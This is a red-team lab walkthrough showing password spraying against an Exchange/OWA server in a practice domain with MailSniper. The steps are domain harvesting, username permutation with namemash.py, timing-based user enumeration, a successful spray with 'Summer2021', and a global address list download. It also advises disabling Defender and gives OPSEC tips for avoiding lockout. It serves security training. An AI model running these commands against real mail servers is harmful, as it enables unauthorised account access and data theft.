Password spraying is an effective technique for discovering weak passwords that users are notorious for using. Patterns such as MonthYear (August2019), SeasonYear (Summer2019) and DayDate (Tuesday6) are very common.


> Be cautious of localisations, e.g. Autumn vs Fall.

Two excellent tools for password spraying against Office 365 and Exchange are [MailSniper](https://github.com/dafthack/MailSniper) and [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit).

On the **attacker-windows** VM, open PowerShell and import MailSniper.ps1.

```shell
PS C:\> ipmo C:\Tools\MailSniper\MailSniper.ps1
```

> You'll have to disable Defender's Real-time protection first.

Enumerate the NetBIOS name of the target domain with `Invoke-DomainHarvestOWA`.

```shell
PS C:\> Invoke-DomainHarvestOWA -ExchHostname 10.10.15.100
[*] Harvesting domain name from the server at 10.10.15.100
The domain appears to be: CYBER or cyberbotic.io
```


Next, we need to find valid usernames from the list of users enumerated from [https://cyberbotic.io](https://www.cyberbotic.io/).
```shell
root@kali:~# cat names.txt
Bob Farmer
Isabel Yates
John King
Joyce Adams
```

[namemash.py](https://gist.github.com/superkojiman/11076951) is a python script that I've used for as long as I can remember. It will take a person's full name, and transform it into possible username permutations.

```shell
root@kali:~# /opt/namemash.py names.txt >> possible-usernames.txt
root@kali:~# head -n 5 possible-usernames.txt
bobfarmer
farmerbob
bob.farmer
farmer.bob
farmerb
```

Copy the list across to the Windows VM.

```shell
PS C:\> pscp root@kali:/root/possible-usernames.txt .
```

`Invoke-UsernameHarvestOWA` uses a timing attack to validate which (if any) of these usernames are valid.

```shell
PS C:\> Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain CYBER -UserList .\possible-usernames.txt -OutFile valid.txt
[*] Now spraying the OWA portal at https://10.10.15.100/owa/
Determining baseline response time...
Response Time (MS)       Domain\Username
770                      CYBER\nigojk
766                      CYBER\hnIYRl
763                      CYBER\DlQFbq
767                      CYBER\ghyWXj
771                      CYBER\uQbXAI

         Baseline Response: 767.4

Threshold: 460.44
Response Time (MS)       Domain\Username
764                      CYBER\THdtMw
776                      CYBER\rVNvmq
854                      CYBER\AvaPOc
767                      CYBER\ZQpHFz
764                      CYBER\WYTZHK
77                       CYBER\iyates
[*] Potentially Valid! User:CYBER\iyatesgs
[*] A total of 1 potentially valid usernames found.
Results have been written to valid.txt.
```

This output shows one valid result for **CYBER\iyates**.

You can run this again and target `-Domain DEV`, which will also find valid results for:

-   DEV\\bfarmer
-   DEV\\jking
-   DEV\\jadams

This requires a little bit of explaining. **cyberbotic.io** is the root of the Active Directory forest, who's NetBIOS name is **CYBER**. But cyberbotic.io has a child domain called **dev.cyberbotic.io**, who's NetBIOS name is **DEV**. From this, we can ascertain that iyates is a user in the parent domain; whilst bfarmer, jking and jadams exist in the child domain.

However, without just guessing at domain names, we don't have a reliable way of knowing DEV ever existed. You may be able to find some clues from your OSINT such as leaked internal domain names.

MailSniper can spray passwords against the valid account(s) identified using, Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS).
```shell
PS C:\> Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\valid.txt -Password Summer2021
[*] Now spraying the OWA portal at https://10.10.15.100/owa/
[*] SUCCESS! User:CYBER\iyates Password:Summer2021
[*] A total of 1 credentials were obtained.
```

**OPSEC Alert**  
  
> In the real world, be aware that these authentication attempts may count towards the domain lockout policy for the users. Too many attempts in a short space of time is not only loud, but may also lock accounts out.

We can do further actions using MailSniper with valid credentials, such as downloading the global address list.

```shell
PS C:\> Get-GlobalAddressList -ExchHostname 10.10.15.100 -UserName CYBER\iyates -Password Summer2021 -OutFile gal.txt
[*] First trying to log directly into OWA to enumerate the Global Address List using FindPeople...

```

If there are names here that we didn't find during OSINT, we can go back and do another round of spraying against them.
